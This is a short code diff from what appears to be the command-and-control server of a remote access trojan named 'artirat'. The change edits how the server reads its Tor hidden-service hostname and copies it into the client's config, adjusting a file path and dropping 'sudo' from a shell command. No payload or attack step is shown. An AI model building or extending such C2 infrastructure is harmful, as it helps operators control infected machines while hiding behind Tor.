@@ -706,11 +706,11 @@ def run_c2_server():
     time.sleep(0.3)
     controller = connect_tor()
     try:
-        file = open('/var/lib/tor/art1rat/hostname',"r")
+        file = open('../../usr/var/lib/tor/artirat/hostname',"r")
         hostname = file.read()
         write_hostname(hostname)
     except:
-        os.system("sudo cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
+        os.system(" cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
         print("[*] Copied Hidden Service Hostname")
         
     print()
